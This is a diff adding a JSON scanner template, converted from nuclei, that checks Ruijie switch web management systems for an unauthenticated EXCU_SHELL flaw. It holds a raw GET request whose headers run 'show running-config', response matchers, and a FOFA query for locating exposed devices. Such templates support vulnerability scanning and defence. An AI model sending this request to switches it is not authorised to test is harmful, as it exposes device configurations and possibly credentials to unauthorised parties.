@@ -1,0 +1,144 @@
+{
+  "id": "ruijie-excu-shell",
+  "name": "Ruijie Switch Web Management System EXCU_SHELL - Information Disclosure",
+  "author": "momika233",
+  "severity": "HIGH",
+  "description": "Ruijie switch WEB management system is vulnerable to an EXCU_SHELL information disclosure issue, potentially exposing sensitive system information to unauthorized parties.\n",
+  "references": [
+    "https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FEXCU_SHELL",
+    "https://github.com/ibaiw/2023Hvv/blob/main/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BA%20WEB%20%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20EXCU_SHELL%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md"
+  ],
+  "tags": [
+    "ruijie",
+    "switch",
+    "disclosure",
+    "misconfig"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "body\u003d\"img/free_login_ge.gif\" \u0026\u0026 body\u003d\"./img/login_bg.gif\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /EXCU_SHELL HTTP/1.1\nHost: {{Hostname}}\nCmdnum: \u00271\u0027\nCommand1: show running-config\nConfirm1: n\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "Building configuration",
+            "Current configuration"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "ruijie-excu-shell",
+    "info": {
+      "name": "Ruijie Switch Web Management System EXCU_SHELL - Information Disclosure",
+      "author": "momika233",
+      "severity": "high",
+      "description": "Ruijie switch WEB management system is vulnerable to an EXCU_SHELL information disclosure issue, potentially exposing sensitive system information to unauthorized parties.\n",
+      "reference": [
+        "https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FEXCU_SHELL",
+        "https://github.com/ibaiw/2023Hvv/blob/main/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BA%20WEB%20%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20EXCU_SHELL%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "body\u003d\"img/free_login_ge.gif\" \u0026\u0026 body\u003d\"./img/login_bg.gif\""
+      },
+      "tags": "ruijie,switch,disclosure,misconfig"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /EXCU_SHELL HTTP/1.1\nHost: {{Hostname}}\nCmdnum: \u00271\u0027\nCommand1: show running-config\nConfirm1: n\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "Building configuration",
+              "Current configuration"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
